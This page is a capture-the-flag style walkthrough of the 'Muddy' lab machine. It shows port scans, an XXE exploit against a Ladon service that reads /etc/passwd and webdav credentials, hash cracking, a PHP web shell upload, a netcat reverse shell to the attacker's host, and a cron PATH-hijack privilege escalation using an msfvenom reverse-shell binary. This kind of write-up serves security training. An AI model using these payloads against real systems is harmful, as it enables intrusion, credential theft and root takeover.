@@ -1,0 +1,364 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Muddy Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Muddy Walkthrough</h1>
+
+    <hr>
+
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#www-data">Shell - www-data</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+    <p>Muddy involved exploiting an LFI to gain access to webdav credentials stored on the server.  Once the credentials are found we can authenticate to webdav in order to upload a webshell, and at that point RCE is achieved.  Privesc involved exploiting a cronjob running netstat without an absolute path.  We are able to write a malicious netstat to a directory in the cronjob PATH variable preceding the location of the legitimate netstat.  This leads us to root.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Thu Sep 16 15:19:46 2021 as: nmap -p- -oN ping_tcp 192.168.248.161
+Nmap scan report for muddy.ugc (192.168.248.161)
+Host is up (0.047s latency).
+Not shown: 65530 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+111/tcp  open  rpcbind
+8888/tcp open  sun-answerbook
+
+# Nmap done at Thu Sep 16 15:20:19 2021 -- 1 IP address (1 host up) scanned in 32.89 seconds
+    </pre>
+
+    <li>Running an nmap scan against the open ports.  This time with -sV and -sC to enumerate service information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Thu Sep 16 15:20:39 2021 as: nmap -p22,25,80,111,8888 -sV -sC -oN script_tcp 192.168.248.161
+Nmap scan report for muddy.ugc (192.168.248.161)
+Host is up (0.038s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
+|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
+|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
+25/tcp   open  smtp    Exim smtpd
+| smtp-commands: muddy Hello muddy.ugc [192.168.49.248], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-generator: WordPress 5.7
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Muddy | Found some mud? Call us! &#8211; A muddy WordPress!
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+8888/tcp open  http    WSGIServer 0.1 (Python 2.7.16)
+|_http-server-header: WSGIServer/0.1 Python/2.7.16
+|_http-title: Ladon Service Catalog
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Sep 16 15:21:28 2021 -- 1 IP address (1 host up) scanned in 48.58 seconds
+    </pre>
+
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <img src="../images/muddy/port80.png">
+
+    <br>
+    <br>
+
+    <li>When we visit the web server on port 80, http://192.168.248.161 it redirects us to muddy.ugc and says page cannot be found.  In order to fix this, we add "192.168.248.161 muddy.ugc" to our /etc/hosts file.  After changing this and revisiting port 80 we find a wordpress site.  The first thing I do is try to login as admin, but the login page does not exist.  Then I try wpscan against it but nothing vulnerable turns up.  Finally I run gobuster and get this:</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Muddy/WebEnum]
+└─$ cat muddy.ugc-raft,php | grep -v 403
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://muddy.ugc
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2021/09/16 11:38:07 Starting gobuster in directory enumeration mode
+===============================================================
+/wp-login.php         (Status: 302) [Size: 0] [--> http://muddy.ugc/404]
+/javascript           (Status: 301) [Size: 311] [--> http://muddy.ugc/javascript/]
+/.                    (Status: 301) [Size: 0] [--> http://muddy.ugc/]             
+/wp-trackback.php     (Status: 200) [Size: 135]                                   
+/wp-config.php        (Status: 200) [Size: 0]                                     
+/wp-admin             (Status: 301) [Size: 309] [--> http://muddy.ugc/wp-admin/]  
+/wp-settings.php      (Status: 500) [Size: 0]                                     
+/wp-cron.php          (Status: 200) [Size: 0]                                     
+/wp-blog-header.php   (Status: 200) [Size: 0]                                     
+/wp-links-opml.php    (Status: 200) [Size: 245]                                   
+/wp-includes          (Status: 301) [Size: 312] [--> http://muddy.ugc/wp-includes/]
+/wp-content           (Status: 301) [Size: 311] [--> http://muddy.ugc/wp-content/] 
+/index.php            (Status: 301) [Size: 0] [--> http://muddy.ugc/]              
+/xmlrpc.php           (Status: 405) [Size: 42]                                     
+/wp-load.php          (Status: 200) [Size: 0]                                      
+/wp-signup.php        (Status: 302) [Size: 0] [--> http://muddy.ugc/wp-login.php?action=register]
+/webdav               (Status: 401) [Size: 456]                                                  
+/wp-activate.php      (Status: 302) [Size: 0] [--> http://muddy.ugc/wp-login.php?action=register]
+===============================================================
+2021/09/16 11:38:54 Finished
+===============================================================
+    </pre>
+
+    <li>The /webdav directory stands out.  If we can gain access to the webdav service we can possibly upload a webshell and gain RCE that way.  We visit this page and it asks for a username and password.  I tried a few combos but nothing worked.  We will note this for later.</li>
+
+    <br>
+
+    <li>The web service on port 8888 is our first point of interest.</li>
+
+    <img src="../images/muddy/port8888.png">
+
+    <br>
+    <br>
+    
+    <li>On this page we see a Ladon service.  We click on the link "muddy" and find a page with available interfaces and a method called "checkout".  When we check searchsploit for exploits for Ladon we are presented with this.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Muddy]
+└─$ searchsploit ladon 
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Ladon Framework for Python 0.9.40 - XML External Entity Expansion                  | xml/webapps/43113.txt
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+    </pre>
+
+
+    <li>The exploit POC gives us the following for retrieving /etc/passwd from the victim</li>
+
+    <pre>
+curl -s -X $&#039;POST&#039; \
+-H $&#039;Content-Type: text/xml;charset=UTF-8&#039; \
+-H $&#039;SOAPAction: \&quot;http://localhost:8888/HelloService/soap11/sayhello\&quot;&#039; \
+--data-binary $&#039;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE uid
+[&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;soapenv:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot;
+xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot;
+xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;
+xmlns:urn=\&quot;urn:HelloService\&quot;&gt;&lt;soapenv:Header/&gt;
+&lt;soapenv:Body&gt;
+&lt;urn:sayhello soapenv:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;
+&lt;uid xsi:type=\&quot;xsd:string\&quot;&gt;&amp;passwd;&lt;/uid&gt;
+&lt;/urn:sayhello&gt;
+&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;&#039; \
+&#039;http://localhost:8888/HelloService/soap11&#039; | xmllint --format -
+    </pre>
+
+    <h2><a id="www-data">Shell - www-data</a></h2>
+
+    <li>If we substitute "localhost" for "muddy.ugc", "sayhello" for "checkout", and "HelloService" for "muddy" we get a working exploit:</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy]
+&#x2514;&#x2500;$ curl -s -X $&#039;POST&#039; \
+-H $&#039;Content-Type: text/xml;charset=UTF-8&#039; \
+-H $&#039;SOAPAction: \&quot;http://muddy.ugc:8888/muddy/soap11/checkout\&quot;&#039; \
+--data-binary $&#039;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE uid
+[&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;soapenv:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot;
+xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot;
+xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;
+xmlns:urn=\&quot;urn:checkout\&quot;&gt;&lt;soapenv:Header/&gt;
+&lt;soapenv:Body&gt;
+&lt;urn:checkout soapenv:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;
+&lt;uid xsi:type=\&quot;xsd:string\&quot;&gt;&amp;passwd;&lt;/uid&gt;
+&lt;/urn:checkout&gt;
+&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;&#039; \
+&#039;http://muddy.ugc:8888/muddy/soap11&#039; | xmllint --format -  
+    </pre>
+
+    <li>Sending this command returns the /etc/passwd content:</li>
+
+    <pre>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;SOAP-ENV:Envelope xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns=&quot;urn:muddy&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
+  &lt;SOAP-ENV:Body SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
+    &lt;ns:checkoutResponse&gt;
+      &lt;result&gt;Serial number: root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/falseian:x:1000:1000::/home/ian:/bin/shDebian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin_rpc:x:108:65534::/run/rpcbind:/usr/sbin/nologinstatd:x:109:65534::/var/lib/nfs:/usr/sbin/nologin&lt;/result&gt;
+    &lt;/ns:checkoutResponse&gt;
+  &lt;/SOAP-ENV:Body&gt;
+&lt;/SOAP-ENV:Envelope&gt;
+    </pre>
+
+    <li>Now that we have a working LFI exploit we will use it to gain more information to gain shell access to the host.  Thinking back to the muddy.ugc/webdav directory, there are likely credentials stored for basic authentication on the web server.  We can find these credentials in /var/www/html/webdav/passwd.dav and use LFI to access them.</li>
+
+    <pre>
+ &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ curl -s -X $&#039;POST&#039; \                                                                                         1 &#x2a2f;
+-H $&#039;Content-Type: text/xml;charset=UTF-8&#039; \
+-H $&#039;SOAPAction: \&quot;http://muddy.ugc:8888/muddy/soap11/checkout\&quot;&#039; \
+--data-binary $&#039;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE uid
+[&lt;!ENTITY passwd SYSTEM &quot;file:///var/www/html/webdav/passwd.dav&quot;&gt;
+]&gt;
+&lt;soapenv:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot;
+xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot;
+xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;
+xmlns:urn=\&quot;urn:checkout\&quot;&gt;&lt;soapenv:Header/&gt;
+&lt;soapenv:Body&gt;
+&lt;urn:checkout soapenv:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;
+&lt;uid xsi:type=\&quot;xsd:string\&quot;&gt;&amp;passwd;&lt;/uid&gt;    
+&lt;/urn:checkout&gt;
+&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;&#039; \
+&#039;http://muddy.ugc:8888/muddy/soap11&#039; | xmllint --format -       
+    </pre>
+
+    <li>Returns:</li>
+
+    <pre>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;SOAP-ENV:Envelope xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns=&quot;urn:muddy&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
+  &lt;SOAP-ENV:Body SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
+    &lt;ns:checkoutResponse&gt;
+      &lt;result&gt;Serial number: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0&lt;/result&gt;
+    &lt;/ns:checkoutResponse&gt;
+  &lt;/SOAP-ENV:Body&gt;
+&lt;/SOAP-ENV:Envelope&gt;
+    </pre>
+
+    <li>I choose to crack the hash ($apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0) using hashcat.  In order to identify the hash mode required, I go to https://hashcat.net/wiki/doku.php?id=example_hashes and search the page for the first characters of the hash, "apr1".  This brings be to the hashcat mode 1600</li>
+
+    <br>
+
+    <img src="../images/muddy/hashcat.png">
+
+    <br>
+    <br>
+
+    <li>We have successfully cracked the hash.  The password is "sleepless".  Now we have the webdav login username "administrant" and the password "sleepless".  We can use the tool cadaver to connect to webdav and upload a web shell.</li>
+
+    <br>
+
+    <li>Web shell contents:</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ cat shell.php                                                                                              255 &#x2a2f;
+&lt;?php system($_REQUEST[&#039;cmd&#039;]); ?&gt;
+    </pre>
+
+    <li>Connecting to webdav and uploading web shell.</li>
+
+    <pre>       
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ cadaver http://muddy.ugc/webdav
+Authentication required for Restricted Content on server `muddy.ugc&#039;:
+Username: administrant
+Password: 
+dav:/webdav/&gt; put shell.php
+Uploading shell.php to `/webdav/shell.php&#039;:
+Progress: [=============================&gt;] 100.0% of 35 bytes succeeded.
+    </pre>
+
+    <li>Now that we have our webshell uploaded we can access it by going to http://muddy.ugc/webdav and logging in with administrant:sleepless.  Once we login we get access to the page with our webshell, shell.php.  Now we can get our reverse shell using netcat.  I setup my reverse listener on port 80 and then sent this through my browser: http://muddy.ugc/webdav/shell.php?cmd=nc -nv 192.168.49.248 80 -e /bin/bash</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ nc -lvnp 80
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 192.168.248.161.
+Ncat: Connection from 192.168.248.161:51630.
+python -c &quot;import pty;pty.spawn(&#039;/bin/bash&#039;);&quot;
+www-data@muddy:/var/www/html/webdav$ export TERM=xterm
+export TERM=xterm
+www-data@muddy:/var/www/html/webdav$ ^Z
+zsh: suspended  nc -lvnp 80
+                                                                                                                     
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ stty raw -echo;fg;                                                                                     148 &#x2a2f; 1 &#x2699;
+[1]  + continued  nc -lvnp 80
+
+www-data@muddy:/var/www/html/webdav$ 
+    </pre>
+
+
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>Once we are on the box, one of the things we check is for cronjobs.  There turns out to be a cronjob we can exploit</li>
+
+    <pre>
+www-data@muddy:/dev/shm$ cat /etc/cron*
+cat: /etc/cron.d: Is a directory
+cat: /etc/cron.daily: Is a directory
+cat: /etc/cron.hourly: Is a directory
+cat: /etc/cron.monthly: Is a directory
+cat: /etc/cron.weekly: Is a directory
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don&#039;t have to run the `crontab&#039;
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+*  *    * * *   root    netstat -tlpn &gt; /root/status &amp;&amp; service apache2 status &gt;&gt; /root/status &amp;&amp; service mysql status &gt;&gt; /root/status
+    </pre>
+
+    <li>The cronjob is calling for the program netstat without an absolute path.  So we look at the PATH variables and see if we can write to any of the ones listed, preceding the one that contains the legitimate version of netstat.  /dev/shm is a directory that we can commonly write to as an unprivileged user and it is the first one listed in the PATH variable.  This is perfect.  So in order to exploit this, we will create a malicious executable named netstat and place it in this directory.  I use msfvenom to create this.</li>
+
+    <br>
+
+    <li>Creating malicious netstat</li>
+
+    <pre>
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.248 LPORT=80 -f elf -o netstat
+    </pre>
+
+    <li>Now I setup a web server on Kali using "python3 -m http.server 80" and then download the file to the victim using wget.  Once I place this file in /dev/shm I set the permissions so it is executable using "chmod +x /dev/shm/netstat".  After that I open a listener up on port 80 on Kali and wait.  Eventually I receive a root shell.</li>
+
+</body>
+</html>
